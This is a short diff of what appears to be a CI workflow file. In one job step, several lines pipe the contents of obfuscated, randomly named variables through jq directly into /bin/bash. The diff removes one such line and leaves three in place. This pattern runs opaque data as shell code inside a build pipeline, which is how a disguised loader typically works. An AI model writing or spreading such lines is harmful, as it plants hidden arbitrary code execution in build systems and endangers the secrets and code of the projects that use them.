@@ -25,7 +25,6 @@ jobs:
           echo $gkx28920 | jq -r .ga5213 | /bin/bash
           printf '%s' "$oruie18220" | jq -r .ojgcd4 | /bin/bash
           echo $jb28448 | jq -r .j405 | /bin/bash
-          printf '%s' "$uvpin905" | jq -r .c9 | /bin/bash
 
       - name: Archive output
         if: always()
